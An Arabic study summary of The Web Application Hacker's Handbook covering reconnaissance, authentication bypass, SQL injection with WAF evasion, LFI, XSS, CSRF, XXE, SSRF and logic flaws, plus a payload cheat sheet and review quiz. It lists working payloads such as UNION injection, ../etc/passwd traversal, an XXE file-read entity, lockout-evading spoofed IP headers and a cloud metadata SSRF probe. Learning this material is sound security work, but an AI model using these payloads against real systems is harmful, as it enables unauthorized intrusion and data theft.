1. منهجية رسم خريطة الويب وتحليلها (Web Mapping & Footprinting)

تتمحور الخطوة الأولى والأهم في اختراق تطبيقات الويب حول رسم خريطة كاملة للمدخلات والمخرجات. يشدد الكاتب على أنه لا يمكن اختراق ما لا تراه.

أ. الاستكشاف اليدوي وتحليل العناوين والـ API endpoints

أوامر استخدام curl لتتبع الطلبات ورؤية ترويسات الاستجابة التفصيلية ومحاولة التلاعب بالترويسات الحساسة:

curl -i -X OPTIONS https://example.com/
curl -i -H "X-Forwarded-For: 127.0.0.1" -H "X-Custom-IP-Authorization: 127.0.0.1" https://example.com/
💻 محاكي مخرجات curl لتتبع الترويسات • Live Simulation
HTTP/2 200 OK Allow: GET, POST, OPTIONS, HEAD Server: nginx X-Frame-Options: SAMEORIGIN X-Content-Type-Options: nosniff

2. كسر آليات التوثيق وإدارة الجلسات (Bypassing Auth & Session)

تعتبر ثغرات كسر آلية التوثيق من أخطر ثغرات الويب لأنها تسمح للمهاجم بالدخول لحساب الأدمن مباشرة.

أ. التلاعب بالتوكن والتحقق من العشوائية (Burp Sequencer)

تعتمد المواقع على قيم عشوائية (Session Tokens). يوضح الكتاب كيفية تجميع 20,000 توكن عبر Burp Suite وإجراء تحليل إحصائي للتحقق من العشوائية (Entropy) للتنبؤ بالتوكن التالي.

ب. تجاوز قفل الحساب (Lockout Bypass)

لتجنب الحظر أثناء التخمين، نستخدم ترويسات تغيير الـ IP مع كل محاولة تخمين:

X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1

3. ثغرات الحقن SQL Injection وتخطي WAF

الحقن بقاعدة البيانات يسمح بالسيطرة الكاملة وسحب البيانات الحساسة أو حتى الحصول على شل (Shell) في السيرفر.

أ. حقن SQL Injection عبر المعامل المصاب

http://example.com/item.php?id=-1 UNION SELECT 1,2,database(),version()--

ب. تخطي جدران حماية الـ WAF (WAF Bypassing)

ترميز المدخلات لحماية البايلود من جدران الحماية:

# ترميز البايلود بالـ URL المزدوج
http://example.com/item.php?id=-1%2520UNION%2520SELECT%25201,2,3--

4. تضمين الملفات وثغرات المسار LFI/RFI

قراءة الملفات الحساسة والتنقل داخل مجلدات خادم الويب.

أ. تجاوز فلاتر الحظر المحلية وقراءة الملف المستهدف

توليد البايلود المخصص لقراءة الملف المحدد:

http://example.com/index.php?page=../../../../etc/passwd

5. ثغرات XSS وتجاوز فلاتر جافا سكريبت

حقن نصوص برمجية لتنفيذها في متصفحات المستخدمين الآخرين.

أ. بايلودات XSS متطورة لتجاوز الحظر

<svg onload="alert(document.domain)">
<img src=x onerror=confirm(1)>
<body onload=prompt(1)>

6. ثغرات CSRF وكشف التلاعب بالرموز

إجبار متصفح المستخدم على تنفيذ إجراءات ضارة دون علمه.

أ. تكتيكات تخطي الـ Anti-CSRF Tokens

  • Method Swap: تحويل طلب POST إلى GET لتخطي فحص التوكن.
  • Token Removal: إزالة التوكن بالكامل من الطلب لمعرفة هل يقبله السيرفر كطلب صالح.

7. ثغرات SSRF و XML Entity (XXE)

إجبار السيرفر على الاتصال بأنظمة داخلية معزولة أو تسريب محتويات الملفات عبر معالجة XML.

أ. بايلود استغلال ثغرات الـ XXE

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>

8. الثغرات المنطقية (Business Logic Flaws)

الثغرات المنطقية تحدث عندما يقوم النظام بمعالجة البيانات بطريقة صحيحة برمجياً ولكنها خاطئة منطقياً.

مثال على ثغرة منطقية: شراء منتجات بقيمة سالبة (Negative Price) حيث يقوم الموقع بإرجاع المال لحسابك بدلاً من خصمه، أو التلاعب بالكمية في سلة المشتريات لتخفيض القيمة الإجمالية إلى صفر.

9. جدول ملخص ثغرات الويب الكبرى (WAHH Cheat Sheet)

جدول مرجعي سريع لأهم البايلودز والأوامر المستعملة في فحص ثغرات الويب الكبرى:

الثغرة البايلود المستعمل طريقة التحقق
SQL Injection http://example.com/item.php?id=-1 UNION SELECT 1,2,database(),version()-- ظهور اسم قاعدة البيانات أو الخطأ
LFI (تضمين ملفات) http://example.com/index.php?page=../../../../etc/passwd قراءة محتويات الملف المستهدف
XML External Entity (XXE) <!ENTITY xxe SYSTEM "file:///etc/passwd"> تسريب الملف عبر استجابة XML
SSRF http://169.254.169.254/latest/meta-data/ سحب بيانات الـ AWS metadata

💡 نصائح وتوجيهات الكاتب الميدانية (WAHH Golden Advice)

جمعنا لك هنا زبدة الخبرة العملية والنصائح الذهبية التي يركز عليها الكاتب في فصول كتابه للتنقيب والعمل الميداني الفعلي:

  • ارسم خريطة كاملة لحالة التطبيق (Application State Machine): تتبع جميع مراحل تسجيل الدفع واسترجاع الحسابات للبحث عن الثغرات المنطقية.
  • اختبر الثغرات المنطقية بالتلاعب بالافتراضات: يفترض المطور دائماً أن الخطوة (أ) تسبق الخطوة (ب)، حاول كسر هذا الترتيب وإرسال طلبات عشوائية.
  • لا تثق أبداً بالتحقق من المدخلات في جهة العميل (Client-Side): اعترض كل طلب بـ Burp Suite وعدل القيم والمعاملات قبل وصولها للسيرفر.

10. بنك الأسئلة والاختبارات التفاعلية الـ 10

🧪 بنك أسئلة مراجعة موسوعة Web Application Hacker's Handbook (انقر لعرض الإجابة النموذجية)
الإجابة النموذجية: يعمل من خلال إرسال نفس المعامل مرتين بقيم مختلفة (مثل `/search?q=select&q=union`). بعض الخوادم والـ WAF تفحص المعامل الأول فقط، بينما التطبيق الخلفي يجمع القيمتين معاً (لتصبح `select union`) مما يسمح بتجاوز الفلتر وتشغيل الاستعلام بنجاح.
الإجابة النموذجية: لأنها تحدث بالكامل داخل متصفح المستخدم (Client-Side) عبر تعديل الـ DOM بواسطة نصوص جافا سكريبت الضعيفة، والطلب لا يرسل البايلود إلى الخادم في كثير من الأحيان (مثل استخدام `#` في العنوان)، وبالتالي لا تستطيع جدران الحماية للويب (WAF) رصدها أو منعها.
الإجابة النموذجية: نقوم بحقن استعلام يحتوي على شرط، وإذا كان الشرط صحيحاً نقوم بإجبار خادم قاعدة البيانات على الانتظار (مثل `SLEEP(5)`). من خلال رصد وقت استجابة السيرفر، نستنتج ما إذا كانت الإجابة صحيحة أم خاطئة، وبالتالي نستخرج البيانات حرفاً بحرف.
الإجابة النموذجية: ثغرة الـ Path Traversal تسمح للمهاجم بقراءة الملفات من نظام التشغيل فقط، بينما ثغرة الـ LFI تقوم بـ "تضمين وتشغيل" الملف ككود برمجى داخل التطبيق (مثل ملفات PHP)، مما يفتح المجال للوصول لتنفيذ الأوامر بالكامل (RCE).
الإجابة النموذجية: حماية `SameSite=Lax` تسمح بإرسال الكوكيز مع طلبات GET الخارجية التي يقوم بها المستخدم بالضغط على روابط صريحة. إذا كان الموقع المستهدف يقبل طلبات GET لتنفيذ عمليات حساسة (مثل تغيير كلمة المرور عبر GET)، يمكن استغلال الـ CSRF بنجاح بالرغم من وجود Lax.
الإجابة النموذجية: نقوم بتعريف كيان خارجي يشير لعنوان داخلي بدلاً من ملف محلي (مثل `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`). عندما يقوم السيرفر بمعالجة الطلب، فإنه سيرسل طلب HTTP داخلي إلى هذا العنوان، مما يمكننا من الوصول للخدمات الداخلية والـ metadata.
الإجابة النموذجية: تحدث عندما يقبل التطبيق معرف جلسة (Session ID) محدد من قبل المهاجم بدلاً من توليد معرف جديد عند تسجيل الدخول. يقوم المهاجم بإعطاء الضحية رابطاً يحتوي على معرف جلسة ثابت، وبمجرد تسجيل الضحية للدخول، تصبح الجلسة صالحة ويستخدم المهاجم نفس المعرف للدخول للحساب.
الإجابة النموذجية: يقوم Sequencer بتجميع عدد ضخم من التوكنز المتتالية (عادة 20,000 توكن) ثم يطبق عليها اختبارات رياضية معقدة (مثل اختبارات FIPS 140-2) للتأكد من درجة العشوائية وعيار الـ Entropy، ليكشف هل قيم التوكنز قابلة للتنبؤ أم عشوائية بالكامل.
الإجابة النموذجية: هو هجوم يعتمد على تعريف كيانات XML متداخلة بشكل متكرر (كل كيان يستدعي الكيان السابق 10 مرات). عند محاولة المعالج فك هذه الكيانات، يتضخم حجم البيانات في الذاكرة بشكل أسي (Exponentially) ليستهلك كافة موارد الذاكرة والمعالج في السيرفر ويسبب توقفه تماماً عن العمل.
الإجابة النموذجية: المنع الجذري يتم عبر استخدام الاستعلامات المجهزة والمعلمة (Parameterized Queries / Prepared Statements) في لغة البرمجة. هذا يضمن أن يتم التعامل مع مدخلات المستخدم كـ Data فقط وليس كجزء من كود الاستعلام الهيكلي، مما يمنع مفسر SQL من تشغيل أي بايلود خارجي.
